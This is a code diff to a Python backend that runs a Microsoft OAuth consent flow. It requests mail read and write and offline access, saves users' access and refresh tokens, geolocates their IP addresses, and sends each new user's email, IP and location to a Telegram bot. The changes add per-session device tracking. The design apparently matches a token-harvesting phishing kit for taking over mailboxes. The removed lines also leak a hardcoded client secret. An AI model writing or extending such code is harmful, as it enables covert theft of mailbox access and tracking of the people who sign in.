@@ -4,39 +4,71 @@ from datetime import datetime, timedelta
 from urllib.parse import urlencode, quote_plus
 import requests
 import os
+import uuid
 
 # =========================
 # CONFIG
 # =========================
 CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
-CLIENT_SECRET = "bqc8Q~Y_Au9DwR6.pBp9Jh.cZKXWIuTQrfafkam-"
+CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
 REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 
-# Telegram (use environment variables)
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
+
 # =========================
-# TOKEN STORAGE
+# TOKEN STORAGE (UPDATED WITH DEVICE INFO)
 # =========================
-def save_token(user_id, token_data):
+def save_token(user_id, session_id, token_data, device_info=None):
     db = SessionLocal()
-    expires_at = int((datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp())
-    record = TenantToken(
-        tenant_id=user_id,
-        access_token=token_data["access_token"],
-        refresh_token=token_data.get("refresh_token"),
-        expires_at=expires_at
+
+    expires_at = int(
+        (datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp()
     )
-    db.merge(record)
+
+    existing = db.query(TenantToken).filter_by(
+        tenant_id=user_id,
+        session_id=session_id
+    ).first()
+
+    if existing:
+        existing.access_token = token_data["access_token"]
+        existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
+        existing.expires_at = expires_at
+
+        # ✅ update device info
+        if device_info:
+            existing.ip_address = device_info.get("ip")
+            existing.user_agent = device_info.get("agent")
+            existing.location = device_info.get("location")
+
+    else:
+        db.add(TenantToken(
+            tenant_id=user_id,
+            session_id=session_id,
+            access_token=token_data["access_token"],
+            refresh_token=token_data.get("refresh_token"),
+            expires_at=expires_at,
+            ip_address=device_info.get("ip") if device_info else None,
+            user_agent=device_info.get("agent") if device_info else None,
+            location=device_info.get("location") if device_info else None
+        ))
+
     db.commit()
     db.close()
 
 
-def get_token(user_id):
+def get_token(user_id, session_id=None):
     db = SessionLocal()
-    token = db.query(TenantToken).filter_by(tenant_id=user_id).first()
+
+    query = db.query(TenantToken).filter_by(tenant_id=user_id)
+
+    if session_id:
+        query = query.filter_by(session_id=session_id)
+
+    token = query.first()
     db.close()
     return token
 
@@ -46,17 +78,19 @@ def get_token(user_id):
 # =========================
 def generate_login_link(user_id_or_tenant: str):
     base_url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
-    state = quote_plus(user_id_or_tenant)
-    
+
+    session_id = str(uuid.uuid4())
+    state_value = f"{user_id_or_tenant}:{session_id}"
+
     params = {
         "client_id": CLIENT_ID,
         "response_type": "code",
         "redirect_uri": REDIRECT_URI,
         "response_mode": "query",
         "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
-        "state": state
+        "state": quote_plus(state_value)
     }
-    
+
     return f"{base_url}?{urlencode(params)}"
 
 
@@ -75,12 +109,15 @@ def send_telegram_alert(message: str):
 
 
 # =========================
-# TOKEN EXCHANGE
+# TOKEN EXCHANGE (UPDATED WITH DEVICE TRACKING)
 # =========================
-def exchange_code_for_token(code: str, user_id: str, client_ip: str = None):
-    """
-    Exchange authorization code for access token and send Telegram alert with email, IP, location.
-    """
+def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
+    if ":" in state:
+        user_id, session_id = state.split(":")
+    else:
+        user_id = state
+        session_id = "default"
+
     data = {
         "client_id": CLIENT_ID,
         "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
@@ -96,9 +133,28 @@ def exchange_code_for_token(code: str, user_id: str, client_ip: str = None):
     if "error" in result:
         raise Exception(f"Token exchange failed: {result['error_description']}")
 
-    save_token(user_id, result)
+    # ✅ Get location string
+    location_str = "unknown"
+    if client_ip:
+        try:
+            loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json")
+            if loc_resp.ok:
+                loc = loc_resp.json()
+                location_str = f"{loc.get('city')}, {loc.get('region')}, {loc.get('country')}"
+        except:
+            pass
 
-    # Fetch user's email from Microsoft Graph
+    # ✅ Device info bundle
+    device_info = {
+        "ip": client_ip,
+        "agent": user_agent,
+        "location": location_str
+    }
+
+    # ✅ Save with device info
+    save_token(user_id, session_id, result, device_info)
+
+    # Fetch email
     headers = {"Authorization": f"Bearer {result['access_token']}"}
     try:
         graph_resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
@@ -106,23 +162,14 @@ def exchange_code_for_token(code: str, user_id: str, client_ip: str = None):
     except:
         email = "unknown"
 
-    # Get location info if IP is provided
-    location = {}
-    if client_ip:
-        try:
-            loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json")
-            if loc_resp.ok:
-                location = loc_resp.json()
-        except:
-            location = {}
-
-    # Send Telegram alert
     message = (
         f"User ID: {user_id}\n"
+        f"Session ID: {session_id}\n"
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
-        f"Location: {location.get('city')}, {location.get('region')}, {location.get('country')}"
+        f"Location: {location_str}"
     )
+
     send_telegram_alert(message)
 
     return result
@@ -131,8 +178,9 @@ def exchange_code_for_token(code: str, user_id: str, client_ip: str = None):
 # =========================
 # TOKEN REFRESH
 # =========================
-def refresh_token(user_id: str):
-    token_record = get_token(user_id)
+def refresh_token(user_id: str, session_id: str = None):
+    token_record = get_token(user_id, session_id)
+
     if not token_record or not token_record.refresh_token:
         raise Exception("No refresh token available. User must re-login.")
 
@@ -150,5 +198,5 @@ def refresh_token(user_id: str):
     if "error" in result:
         raise Exception(f"Token refresh failed: {result['error_description']}")
 
-    save_token(user_id, result)
+    save_token(user_id, token_record.session_id, result)
     return result
